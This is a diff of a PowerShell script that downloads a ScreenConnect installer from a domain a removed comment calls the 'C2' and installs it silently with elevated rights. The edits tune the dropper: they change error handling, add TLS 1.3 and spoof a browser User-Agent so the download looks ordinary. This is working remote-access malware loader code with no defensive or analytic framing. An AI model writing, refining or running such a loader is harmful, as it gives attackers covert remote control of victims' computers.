@@ -1,4 +1,4 @@
-$ErrorActionPreference = 'SilentlyContinue'
+$ErrorActionPreference = 'Stop'
 $state = New-Object System.Collections.ArrayList
 
 $sb = $false
@@ -40,13 +40,13 @@ $msiUrl = 'https://lerealsiegediaries.com/Bin/ScreenConnect.ClientSetup.msi?e=Ac
 $msiPath = Join-Path $env:TEMP 'setup.msi'
 
 try {
-    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-
-    # Download MSI directly from C2
-    (New-Object System.Net.WebClient).DownloadFile($msiUrl, $msiPath)
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13
+    $wc = New-Object System.Net.WebClient
+    $wc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
+    $wc.DownloadFile($msiUrl, $msiPath)
 
     # Install MSI
-    $proc = Start-Process msiexec.exe -ArgumentList "/i `"$msiPath`" /qn /norestart" -Verb RunAs -WindowStyle Hidden -PassThru -Wait
+    $proc = Start-Process msiexec.exe -ArgumentList "/i `"$msiPath`" /qn /norestart" -Verb RunAs -PassThru -Wait
 
     # Cleanup MSI
     try { Remove-Item $msiPath -Force } catch {}
